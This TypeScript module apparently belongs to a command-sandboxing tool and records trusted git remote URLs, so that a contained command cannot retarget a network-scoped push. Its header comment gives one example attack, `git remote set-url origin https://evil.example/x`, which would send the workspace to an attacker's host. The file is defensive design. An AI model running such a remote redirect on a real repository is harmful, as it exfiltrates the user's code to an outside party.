import { z } from 'zod'
import { storageGet, storageSet } from '../storage/storage.ts'

/**
 * The remote URLs a network scope may trust, recorded outside anything a
 * contained command can write.
 *
 * A network-scoped `git push origin HEAD` reaches whatever host
 * `remote.origin.url` names, and in the primary checkout contained commands may
 * write `.git/config` (`git push -u` and `git branch --set-upstream-to` need
 * to). So `git remote set-url origin https://evil.example/x` run contained
 * would otherwise aim the next scoped push, and the whole workspace, at that
 * host. A remote only counts once its URLs match what was recorded here:
 *
 *  - when the user trusts the workspace, every remote is recorded as it stands
 *    (the user is vouching for the repository then);
 *  - for a repository first seen without such a record, only remotes on a
 *    well-known forge are recorded, since the config may already have been
 *    edited by a contained command; anything else asks until the workspace is
 *    trusted again;
 *  - a remote that is added or changed afterwards is never recorded on sight.
 */

const REMOTE_PINS_KEY = 'scopedNetworkRemotePins'

export interface PinnedRemote {
  url: string | null
  pushUrl: string | null
}

const PinStoreSchema = z.record(
  z.string(),
  z.record(z.string(), z.object({ url: z.string().nullable(), pushUrl: z.string().nullable() })),
)
type PinStore = z.infer<typeof PinStoreSchema>

function loadPins(): PinStore {
  const parsed = PinStoreSchema.safeParse(storageGet(REMOTE_PINS_KEY))
  return parsed.success ? parsed.data : {}
}

/** Recorded remotes for a repository's common git directory, or null when none were. */
export function pinnedRemotes(commonDir: string): ReadonlyMap<string, PinnedRemote> | null {
  const entry = loadPins()[commonDir]
  return entry ? new Map(Object.entries(entry)) : null
}

/** Record `remotes` for `commonDir`, replacing any earlier record. */
export function pinRemotes(commonDir: string, remotes: ReadonlyMap<string, PinnedRemote>): void {
  const pins = loadPins()
  pins[commonDir] = Object.fromEntries(
    [...remotes].map(([name, urls]) => [name, { url: urls.url, pushUrl: urls.pushUrl }]),
  )
  storageSet(REMOTE_PINS_KEY, pins)
}
